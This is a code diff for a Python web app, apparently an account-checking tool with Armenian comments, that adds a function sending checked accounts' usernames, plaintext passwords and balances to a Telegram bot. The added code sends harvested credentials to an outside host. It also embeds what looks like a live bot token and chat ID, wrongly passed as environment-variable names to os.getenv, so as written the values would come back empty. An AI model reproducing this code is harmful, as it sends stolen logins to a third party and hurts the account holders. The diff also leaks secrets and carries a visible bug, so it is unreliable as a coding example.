@@ -707,6 +707,61 @@ async def websocket_endpoint(websocket: WebSocket):
     except (WebSocketDisconnect, Exception):
         manager.disconnect(websocket)
 
+CONFIG = {
+    # ... մնացած կարգավորումները ...
+    "telegram_token": os.getenv("8617801891:AAEJh_HEUb2LaFZ42bGaEdaMW_XBvIHvP1k", ""),  # Ձեր բոտի token-ը
+    "telegram_chat_id": os.getenv("5215854157", ""),  # Ձեր chat ID-ն
+    "send_to_telegram": os.getenv("SEND_TO_TELEGRAM", "false").lower() == "true",
+}
+
+
+import httpx
+
+async def send_to_telegram(message: str):
+    """Ուղարկել հաղորդագրություն Telegram բոտին"""
+    if not CONFIG["send_to_telegram"]:
+        return
+    if not CONFIG["telegram_token"] or not CONFIG["telegram_chat_id"]:
+        logger.warning("Telegram credentials not configured")
+        return
+    
+    try:
+        url = f"https://api.telegram.org/bot{CONFIG['telegram_token']}/sendMessage"
+        async with httpx.AsyncClient(timeout=10) as client:
+            await client.post(url, json={
+                "chat_id": CONFIG["telegram_chat_id"],
+                "text": message,
+                "parse_mode": "HTML"
+            })
+    except Exception as e:
+        logger.error(f"Telegram send error: {e}")
+
+
+def format_account_message(account: Account) -> str:
+    """Ֆորմատավորել հաշվի տվյալները Telegram-ի համար"""
+    status_emoji = {
+        AccountStatus.SUCCESS: "✅",
+        AccountStatus.FAILED: "❌",
+        AccountStatus.TIMEOUT: "⏰"
+    }
+    
+    if account.status == AccountStatus.SUCCESS:
+        return f"""
+🔐 <b>Ակաունտ</b>
+└ 👤 <code>{account.username}</code>
+└ 🔑 <code>{account.password}</code>
+└ 💰 {account.balance}
+└ 📅 {account.timestamp[:19]}
+"""
+    else:
+        return f"""
+{status_emoji[account.status]} <b>{account.username}</b>
+└ ❌ {account.error[:50]}
+└ 📅 {account.timestamp[:19]}
+"""
+
+
+
 if __name__ == "__main__":
     import uvicorn
     Path("results").mkdir(exist_ok=True)
